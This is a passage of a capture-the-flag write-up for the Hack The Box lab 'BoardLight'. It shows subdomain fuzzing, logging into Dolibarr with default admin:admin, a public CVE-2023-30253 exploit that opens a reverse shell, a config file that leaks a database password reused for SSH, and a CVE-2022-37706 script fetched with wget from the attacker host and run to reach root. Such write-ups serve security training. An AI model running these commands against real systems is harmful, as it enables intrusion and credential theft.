+                                </code></pre><figure id="8c657eb2-dc50-48a7-9b54-910491b79748" class="image"><a href="../img/BoardLight/Untitled.png"><img style="width:708px" src="../img/BoardLight/Untitled.png"/></a></figure><h2 id="14f5bae0-0c07-4e47-af86-d138f4d06cd5" class="">DNS Enumeration</h2><figure id="ebe89a8f-3ca6-4d8c-ab23-fe3885703c18" class="image"><a href="../img/BoardLight/Untitled 1.png"><img style="width:708px" src="../img/BoardLight/Untitled 1.png"/></a></figure><figure id="07f68750-8812-4582-a88b-b5ac16663198" class="image"><a href="../img/BoardLight/Untitled 2.png"><img style="width:708px" src="../img/BoardLight/Untitled 2.png"/></a></figure><p id="06ad3166-381f-4aea-b135-e2e8082c636b" class="">Let’s run dns enumeration</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f23c58ac-24d6-4445-afaa-6bf6976bde57" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u &quot;http://board.htb/&quot; -H &quot;Host:FUZZ.board.htb&quot; -t 50 --hh 15949
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://board.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000072:   200        149 L    504 W      6360 Ch     &quot;crm&quot;                                               
+000009532:   400        10 L     35 W       301 Ch      &quot;#www&quot;                                              
+000010581:   400        10 L     35 W       301 Ch      &quot;#mail&quot;                                             
+
+Total time: 0
+Processed Requests: 19966
+Filtered Requests: 19963
+Requests/sec.: 0
+
+</code></pre><p id="a32d525e-5c1b-44a2-9596-2928696f01d0" class="">Add it!</p><figure id="df0ee004-2e99-45f8-9cd4-474a0e74bb94" class="image"><a href="../img/BoardLight/Untitled 3.png"><img style="width:961px" src="../img/BoardLight/Untitled 3.png"/></a></figure><figure id="821ebc33-df05-4d7d-8fa0-f86c56497005" class="image"><a href="../img/BoardLight/Untitled 4.png"><img style="width:1920px" src="../img/BoardLight/Untitled 4.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21970af7-e479-4232-806d-928c4b1e159a" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ whatweb &quot;http://crm.board.htb/&quot; -a 3
+http://crm.board.htb/ [200 OK] Apache[2.4.41], Cookies[DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92], IP[10.10.11.11], JQuery, Meta-Author[Dolibarr Development Team], PasswordField[password], Script, Title[Login @ 17.0.0], UncommonHeaders[x-content-type-options,referrer-policy], X-Frame-Options[SAMEORIGIN]
+</code></pre><h2 id="cbfff655-fa9e-4dcb-8fa9-c3a687c0a954" class="">Findings</h2><ul id="00d01e90-317f-4601-9496-4da548f5f4e9" class="bulleted-list"><li style="list-style-type:disc">PHP</li></ul><ul id="e2fb038a-cb20-4378-808a-a84eca03f8f1" class="bulleted-list"><li style="list-style-type:disc">crm.board.htb domain and login</li></ul><ul id="2bda7dd9-7f85-4fc4-a0e4-e60464dd8e31" class="bulleted-list"><li style="list-style-type:disc">Dolibarr 17.0.0 (exploitable)</li></ul><p id="69b8be1a-2c70-42eb-a23c-668fdcdf5c0a" class="">
+</p><p id="3dc25045-584e-41ee-bb6a-1bd4caa24d68" class="">
+</p><p id="1ec27f0b-9aa7-496d-be08-43f80be63c68" class="">
+</p><p id="d90b9e72-a2bc-4cb5-b88f-599a3b914af0" class="">
+</p><h1 id="66ccc2be-90f2-4ba8-b0de-2054eae07eec" class="">User</h1><p id="bf2e8d60-5838-42ce-a960-5e9da6fa48ff" class="">Searching “dolibarr 17.0.0 exploit” on google u’ll find public CVE with exploits &amp; POC’s → Chec <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main">exploit</a> but we need user and password, let’s tru admin:admin</p><figure id="6d61340e-2a92-431d-8f6b-3e0f504a321e" class="image"><a href="../img/BoardLight/Untitled 5.png"><img style="width:708px" src="../img/BoardLight/Untitled 5.png"/></a></figure><p id="605db2de-852c-4a22-835a-d4419e3e00d2" class="">Done! now we are ready for reverse shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aac0e681-880e-4a6d-bfba-96761c7edba9" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ python CVE_2023_30253.py http://crm.board.htb admin admin 10.10.14.3 1205
+[*] Trying authentication...
+[**] Login: admin
+[**] Password: admin
+[*] Trying created site...
+[*] Trying created page...
+[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7654c1ae-9b80-4aea-b4df-f90d7620b6fc" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~]
+└─$ nc -lnvp 1205               
+listening on [any] 1205 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.11] 36000
+bash: cannot set terminal process group (846): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
+www-data
+</code></pre><p id="70b3af32-5fbd-4c0c-a125-0073bed05454" class="">I wanna search the word “password” in all files and get the line and filename</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="937ec775-3c0d-4783-a05a-c613563b82a8" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">www-data@boardlight:~/html/crm.board.htb$ find . -type f -exec grep -HnA2 &quot;pass&quot; {} \;
+www-data@boardlight:~/html/crm.board.htb/htdocs$ cd conf
+cd conf
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
+ls
+conf.php
+conf.php.example
+conf.php.old
+www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
+cat conf.php
+&lt;?php
+//
+// File generated by Dolibarr installer 17.0.0 on May 13, 2024
+//
+// Take a look at conf.php.example file for an example of conf.php file
+// and explanations for all possibles parameters.
+//
+$dolibarr_main_url_root=&#x27;http://crm.board.htb&#x27;;
+$dolibarr_main_document_root=&#x27;/var/www/html/crm.board.htb/htdocs&#x27;;
+$dolibarr_main_url_root_alt=&#x27;/custom&#x27;;
+$dolibarr_main_document_root_alt=&#x27;/var/www/html/crm.board.htb/htdocs/custom&#x27;;
+$dolibarr_main_data_root=&#x27;/var/www/html/crm.board.htb/documents&#x27;;
+$dolibarr_main_db_host=&#x27;localhost&#x27;;
+$dolibarr_main_db_port=&#x27;3306&#x27;;
+$dolibarr_main_db_name=&#x27;dolibarr&#x27;;
+$dolibarr_main_db_prefix=&#x27;llx_&#x27;;
+$dolibarr_main_db_user=&#x27;dolibarrowner&#x27;;
+$dolibarr_main_db_pass=&#x27;serverfun2$2023!!&#x27;;
+$dolibarr_main_db_type=&#x27;mysqli&#x27;;
+$dolibarr_main_db_character_set=&#x27;utf8&#x27;;
+$dolibarr_main_db_collation=&#x27;utf8_unicode_ci&#x27;;
+// Authentication settings
+$dolibarr_main_authentication=&#x27;dolibarr&#x27;;
+
+</code></pre><p id="d7cc5c2e-7677-47e3-9127-7e9bab3e64ab" class="">Let&#x27;s try connecting with ssh</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7a0dafb6-5c5c-4f75-85ae-6e363a97a406" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ ssh larissa@10.10.11.11       
+The authenticity of host &#x27;10.10.11.11 (10.10.11.11)&#x27; can&#x27;t be established.
+ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;10.10.11.11&#x27; (ED25519) to the list of known hosts.
+larissa@10.10.11.11&#x27;s password: 
+Last login: Sun Jun  2 15:54:14 2024 from 10.10.14.14
+larissa@boardlight:~$ cat user.txt 
+a*******************************7
+</code></pre><p id="5c90d799-bae4-4c65-bca7-0f7db4b536f4" class="">
+</p><h1 id="561f6157-7224-4da0-bc5a-233fa81c3f51" class="">Root</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee4e55d2-0ba4-4180-ad9d-06acc9ea5728" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">linpeas.sh findings!
+
+71780     sed-Es,jdwp|tmux |screen |--inspect|--remote-debugging-port,&amp;,g
+	https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+
+Files with capabilities (limited to 50):
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+	https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+	
+	
+-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary)
+-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary)
+
+
+Maybe searching Enlightenment UID binary explot
+</code></pre><p id="f90ee53d-cab8-4a50-8ad8-d85b4ac33abd" class="">Maybe searching Enlightenment UID binary exploit:</p><ul id="3712c2d8-cfa9-44fd-9353-f74757d24d1d" class="bulleted-list"><li style="list-style-type:disc"><a href="https://www.exploit-db.com/exploits/51180">Exploit 1</a></li></ul><ul id="95b70835-5fa7-459f-bc38-26ee487046ae" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit?search=1">Exploit 2</a></li></ul><p id="8234c286-dc28-495a-829b-4a8b5903075a" class="">Both are the same</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ff3c6aa5-9a1e-4cae-bfdf-2015af9666ea" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">larissa@boardlight:/usr/lib/x86_64-linux-gnu/enlightenment/modules$ cd /tmp
+larissa@boardlight:/tmp$ wget http://10.10.14.3:8000/CVE_2022_37706.sh
+--2024-06-02 22:22:36--  http://10.10.14.3:8000/CVE_2022_37706.sh
+Connecting to 10.10.14.3:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 709 [text/x-sh]
+Saving to: ‘CVE_2022_37706.sh’
+
+CVE_2022_37706.sh             100%[==============================================&gt;]     709  --.-KB/s    in 0s      
+
+2024-06-02 22:22:36 (53.5 MB/s) - ‘CVE_2022_37706.sh’ saved [709/709]
+
+larissa@boardlight:/tmp$ chmod +x CVE_2022_37706.sh
+larissa@boardlight:/tmp$ ./CVE_2022_37706.sh
+CVE-2022-37706
+[*] Trying to find the vulnerable SUID file...
+[*] This may take few seconds...
+[+] Vulnerable SUID binary found!
+[+] Trying to pop a root shell!
+[+] Enjoy the root shell :)
+mount: /dev/../tmp/: can&#x27;t find in /etc/fstab.
+# whoami
+root
+# cat /root/root.txt
+4*******************************5
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
